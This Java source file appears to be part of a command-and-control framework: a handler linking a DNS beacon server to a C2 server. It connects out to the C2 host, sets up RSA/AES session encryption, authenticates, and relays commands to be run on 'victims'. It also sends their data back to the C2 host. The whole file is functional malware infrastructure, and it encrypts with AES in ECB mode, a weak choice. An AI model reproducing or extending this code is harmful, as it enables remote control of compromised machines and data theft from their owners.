package Servers.DnsBeacon;

import java.io.IOException;
import java.net.NoRouteToHostException;
import java.net.Socket;
import java.security.SecureRandom;

import Servers.Duplexer;
import Servers.keepAlive;
import Servers.encryption.aes.*;
import Servers.encryption.rsa.*;

public class DnsBeaconC2Handler implements Runnable{
    // Pointer to the Long Range Beacon Server that interacts with the clients (victims)
    private DnsBeaconServer beaconServer;

    // Pointer to the C2 Server that the user interacts with the user
    private Duplexer C2Server;

    // Hashed Password for Authentication to the C2 Server
    private String passwordDigest;

    // Class and Thread that send a KEEP_ALIVE Messsage to the C2 Server every 30 seconds to keep the socket open
    private keepAlive keepAliveClass;
    private Thread keepAliveThread;
    private Object sendLock;

    // Used to know if this thread should kill the server, due to a unsuccessful connection to the C2
    private Boolean killServer;

    // Class used for AES encryption
    private aes aes;
    private String aesKey;

    // Variables used to securely generate AES key
    private final String HEX_CHARS;
    private final SecureRandom RANDOM;

    /**
     * This starts a thread that sends and receives messages with the C2 Server
     * 
     * This thread then interacts with the Long Range Beacon Server, the Long Range Beacon
     * Server then interacts with all of the clients (victims)
     * 
     * @param beaconServer The Long Range Beacon Server
     * @param C2ServerIPAddress The IP Address of the C2 Server
     * @throws IOException
     */
    protected DnsBeaconC2Handler(DnsBeaconServer beaconServer, String C2ServerIPAddress, String passwordDigest) throws IOException{
        this.beaconServer = beaconServer;

        this.killServer = false;
        try{
            Socket socket = new Socket(C2ServerIPAddress, 1234);
            this.C2Server = new Duplexer(socket);
        } catch (NoRouteToHostException e){
            this.killServer = true;
        }
        
        this.passwordDigest = passwordDigest;
        this.sendLock = new Object();

        this.HEX_CHARS = "0123456789abcdef";
        this.RANDOM = new SecureRandom();
    }

    /**
     * Function meant to be used by the Long Range Beacon Server
     * to send data back to the C2 Server when it's requested
     * 
     * @param data The Data to be sent back to the C2 Server
     */
    protected void sendDataToC2Server(String data){
        synchronized(sendLock){
            C2Server.send(aes.encrypt(data), true);
        }
    }

    @Override
    public void run(){
        Boolean authenticationSentinel = true;
        if(killServer){
            try {
                beaconServer.quit("Could not connect to C2 Server");
                authenticationSentinel = false;
            } catch (IOException e){
                e.printStackTrace();
            }
        } else {
            /**
             * Commands from the C2 Server are defined by 3 attributes
             * Verb - Command
             * Scope - Windows, Linux, or IPv4 Address
             * Command - what command to run
             * 
             * All of this data is sent from the C2 server in a JSON formatted string
             */

            // The C2 Server will start the connection by sending its public key.
            String nPubKey = "";
            String ePubKey = "";
            try{
                // duplexer.receive() includes a /n at the end, so we need to remove that for the BigInteger class to be able to handle it correctly
                nPubKey = C2Server.receive(true);
                nPubKey = nPubKey.substring(0, nPubKey.length() - 1);
                ePubKey = C2Server.receive(true);
                ePubKey = ePubKey.substring(0, ePubKey.length() - 1);
            } catch (IOException e){
                e.printStackTrace();
            }
            // This Beacon server will then use the public key to encrypt the AES session key,
            // and send the AES session key back to the C2 server
            rsa rsaClient = new rsa(nPubKey, ePubKey);

            // Generate AES key
            StringBuilder hexString = new StringBuilder(32);
            for (int i = 0; i < 32; i++) {
                hexString.append(HEX_CHARS.charAt(RANDOM.nextInt(HEX_CHARS.length())));
            }
            aesKey = hexString.toString();
            
            aes = new aes(aesKey, modes.ECB);
            keepAliveClass = new keepAlive(C2Server, sendLock, true, false, this.aes);
            keepAliveThread = new Thread(keepAliveClass);
            C2Server.send(rsaClient.encrypt(aesKey), true);

            // Attempt to authenticate with the C2 Server. If authentication fails, gracefully close, and distribute the quit
            // message to the Beacon Server for further distribution.
            C2Server.send(aes.encrypt(passwordDigest), true);
            try{
                String message;
                synchronized(C2Server){
                    message = aes.decrypt(C2Server.receive(true));
                }
                if(!(message.equals("Authentication Successful"))){
                    String reason = "Authentication with the C2 Server Unsuccesful. Message Received from C2 Server: " + message;
                    beaconServer.quit(reason);
                    C2Server.close();
                    authenticationSentinel = false;
                } else {
                    keepAliveThread.start();
                }
            } catch(IOException e){
                e.printStackTrace();
            }
        }
        
        while(authenticationSentinel){
            try{
                String message;
                synchronized(C2Server){
                    message = aes.decrypt(C2Server.receive(true));
                }
                if(!(message.equals("KEEP_ALIVE"))){
                    if(message.equals("quit")){
                        beaconServer.quit("C2 Server Shutting Down");
                        C2Server.close();
                        authenticationSentinel = false;
                        keepAliveClass.stopKeepAlive();
                        break;
                    }
                    beaconServer.distributeCommands(message);
                }
            } catch (NullPointerException e){
                try {
                    beaconServer.quit("C2 Server shut down connection.");
                    authenticationSentinel = false;
                } catch (IOException er){
                    er.printStackTrace();
                }
            } catch(IOException e){
                e.printStackTrace();
                keepAliveClass.stopKeepAlive();
            }
        }
    }
}